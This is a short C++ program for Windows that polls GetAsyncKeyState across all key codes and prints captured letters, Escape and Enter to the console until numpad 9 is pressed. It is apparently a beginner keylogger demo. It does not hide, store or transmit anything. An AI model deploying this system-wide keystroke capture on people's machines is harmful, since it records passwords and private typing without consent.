#include <iostream>
#include <Windows.h>
#include <cctype>

int main()
{

	while (!(GetAsyncKeyState(VK_NUMPAD9) & 0b1))
	{

		for (int i = 0; i < 256; i++)
		{

			//if key was pressed...
			if (GetAsyncKeyState(i) & 0b1)
			{

				if (std::isupper(i))
				{
					std::cout << (char)i; //print the letters
				}
				else if (i == VK_ESCAPE)
				{
					std::cout << "[ESCAPE]"; //other keys have special macros defined
				}
				else if (i == VK_RETURN)
				{
					std::cout << "[ENTER]";
				}
				//...
				//todo add some other special keys cases

			};

		}



	}


	return 0;
}
